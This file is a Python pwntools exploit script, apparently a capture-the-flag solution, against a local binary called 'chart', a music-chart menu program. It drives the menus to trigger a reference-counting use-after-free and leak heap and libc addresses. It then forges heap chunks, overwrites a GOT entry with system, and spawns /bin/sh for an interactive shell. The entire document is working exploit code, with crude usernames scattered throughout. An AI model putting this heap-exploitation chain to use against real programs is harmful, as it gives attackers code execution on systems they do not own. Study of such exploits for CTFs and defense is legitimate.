from pwn import *

r = process("./chart")

raw_input("$")

def register(type_, ID, PW, name, profile=""): # user 1, composer 2
	r.send("2\n")
	print r.recvuntil("Type :")
	r.send(str(type_)+"\n")
	print r.recvuntil("ID : ")
	r.send(ID+"\n")
	print r.recvuntil("PW : ")
	r.send(PW+"\n")
	print r.recvuntil("Name : ")
	r.send(name+"\n")
	if(type_ == 1):
		print r.recvuntil(">")
	else:
		print r.recvuntil("Profile : ")
		r.send(profile+"\n")
		print r.recvuntil(">")

def login(ID, PW):
	r.send("1\n")
	print r.recvuntil("ID :")
	r.send(ID+"\n")
	print r.recvuntil("PW :")
	r.send(PW+"\n")
	print r.recvuntil(">")

def writeMusic(name, lyric):
	r.send("1\n")
	print r.recvuntil("Name : ")
	r.send(name+"\n")
	print r.recvuntil("Lyrics : ")
	r.send(lyric+"\n")
	print r.recvuntil(">")

def deleteMusic(index):
	r.send("2\n")
	print r.recvuntil("Index : ")
	r.send(str(index)+"\n")
	print r.recvuntil(">")

def editProfile(newProfile):
	r.send("3\n")
	print r.recvuntil("Edit Profile : ")
	r.send(newProfile+"\n")
	print r.recvuntil(">")

def editMusic(musicIdx, newLyric):
	r.send("4\n")
	print r.recvuntil("Index :")
	r.send(str(musicIdx)+"\n")
	r.send(newLyric+"\n")
	print r.recvuntil(">")

def logOut(type_):
	if type_== 1: # user
		r.send("9\n")
		print r.recvuntil(">")
	else: # composer
		r.send("5\n")
		print r.recvuntil(">")

def createVeryBox(boxName):
	r.send("1\n")
	print r.recvuntil("Box Name :")
	r.send(boxName+"\n")
	print r.recvuntil(">")

def deleteVeryBox(boxIndex):
	r.send("2\n")
	print r.recvuntil("Index :")
	r.send(str(boxIndex)+"\n")
	print r.recvuntil(">")

def buyMusic(index):
	r.send("3\n")
	print r.recvuntil("Index :")
	r.send(str(index)+"\n")
	print r.recvuntil(">")

def putMusicBox(boxIndex, musicIndex):
	r.send("4\n")
	print r.recvuntil("box :")
	r.send(str(boxIndex)+"\n")
	print r.recvuntil("box? > ")
	r.send(str(musicIndex)+"\n")
	print r.recvuntil(">")

def moveBox2Box(destIdx, srcIdx, x, y):
	r.send("5\n")
	print r.recvuntil("index :")
	r.send(str(destIdx)+"\n")
	print r.recvuntil("index :")
	r.send(str(srcIdx)+"\n")
	print r.recvuntil("x :")
	r.send(str(x)+"\n")
	print r.recvuntil("y :")
	r.send(str(y)+"\n")
	print r.recvuntil(">")

def deleteMusicU(musicIndex):
	r.send("8\n")
	print r.recvuntil("Index :")
	r.send(str(musicIndex)+"\n")
	print r.recvuntil(">")

print r.recvuntil(">")

register(1, "mathboy", "mathboy", "mathboy")
register(2, "mitsuha", "mitsuha", "mitsuha", "A"*0x40)

login("mitsuha", "mitsuha") # composer now!
writeMusic("music1", "music1 hello")
writeMusic("sex", "sex")
logOut(2) # composer logout

register(2, "sexma", "sex", "sex", "B"*0x40) # for attack
login("sexma", "sex") # write for attackvec
writeMusic("aaaaaaaa", "b"*0x39) # write for attackvec, music idx=2
logOut(2)

login("mathboy", "mathboy") # user now!
createVeryBox("myBox")
buyMusic(0)
putMusicBox(0, 0) # go music0 to box 0.
deleteMusicU(0)
logOut(1) # user logout

login("mitsuha", "mitsuha")
deleteMusic(0)
logOut(2)

login("mathboy", "mathboy") # user again!
moveBox2Box(0, 0, 0, 0) # 0, 0 -> 0, 0, reference counting bug occured.

createVeryBox(p64(0x607340)+"\n")

r.send("6\n")

print r.recvuntil("--\n0. ")
recved = r.recvuntil("\n")[:-1]
recved += "\x00"*(8-len(recved))
heap = u64(recved)

print r.recvuntil(">")

print "heap addr: " + hex(heap)

createVeryBox("sexMaster") # second box

buyMusic(1)
putMusicBox(2, 0) # go music1 to box 2
deleteMusicU(0)
logOut(1)

login("mitsuha", "mitsuha")
deleteMusic(1)
logOut(2)

login("mathboy", "mathboy")
moveBox2Box(2, 2, 0, 0)
logOut(1) # logout User

login("mitsuha", "mitsuha")
editProfile(p64(heap+0x350)+p64(0x0)+"A"*8+p64(heap-0x270))
logOut(2) # logout Composer

register(1, p64(heap+0xc0), "P"*0x40, "Q"*0x40)

login("sexma", "sex") # login for attack
editProfile("B"*0x30+p64(0x0)+p64(0x71))
editMusic(2, p64(0x0)+p64(0x21)+"b"*0x20+p64(0x0)+"\x21")
logOut(2)

login("mathboy", "mathboy")
deleteVeryBox(2)
logOut(1) # logout User

register(2, "payload", "payload", "payload", "A"*0x60) # overlapped!
login("payload", "payload")

payload = p64(0x0) + p64(0x31)
payload += p64(heap+0x3b0)
payload += p64(0x605030)

editProfile(payload)
logOut(2)

login("mathboy", "mathboy")
buyMusic(2)

r.send("7\n")
print r.recvuntil("Lyrics : ")

recved = r.recv(6)
libc = u64(recved+"\x00\x00")
libc_base = libc - 0x66bf10
system = libc_base + 0x45390

print r.recvuntil(">")

print "libc: " + hex(libc)

logOut(1)

login("sexma", "sex") # to edit
editMusic(2, p64(system)[:6]) # got overwrite!
logOut(2)

login("mathboy", "mathboy")

createVeryBox("/bin/sh")

r.send("2\n")
print r.recvuntil("Index :")
r.send("2\n") # trigger system("/bin/sh")!

r.interactive()
